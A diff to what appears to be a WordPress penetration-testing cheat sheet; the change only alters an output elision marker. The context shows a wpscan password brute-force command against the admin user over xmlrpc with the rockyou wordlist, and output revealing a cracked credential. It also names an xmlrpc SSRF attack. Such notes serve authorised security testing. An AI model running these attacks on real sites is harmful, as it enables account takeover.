@@ -158,10 +158,10 @@ wpscan --proxy http://127.0.0.1:8080 --disable-tls-checks --url <target>
 
 ```plain
 $ wpscan --url 10.10.10.10/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50 
-[...SNIP...]
+[...]
 [+] Performing password attack on Xmlrpc against 1 user/s
 [SUCCESS] - admin / my2boys                                                         
-[...SNIP...]
+[...]
 ```
 
 ### XMLRPC.php attack SSRF
